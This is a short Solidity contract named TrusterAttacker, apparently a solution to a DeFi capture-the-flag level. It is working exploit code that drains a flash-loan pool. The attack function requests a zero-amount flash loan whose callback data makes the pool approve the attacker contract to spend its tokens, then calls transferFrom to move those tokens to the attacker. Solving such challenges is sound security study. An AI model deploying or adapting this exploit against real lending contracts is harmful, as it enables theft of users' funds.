// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";

interface InterfaceTrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external;
}

contract TrusterAttacker {

    IERC20 public immutable token;

    constructor (address tokenAddress) {
        token = IERC20(tokenAddress);
    }

    function attack(uint256 amount, address poolAdd, address attackerAdd) external {
        InterfaceTrusterLenderPool pool = InterfaceTrusterLenderPool(poolAdd);
        pool.flashLoan(0, attackerAdd, address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), amount));
        token.transferFrom(poolAdd, attackerAdd, amount);
    }
}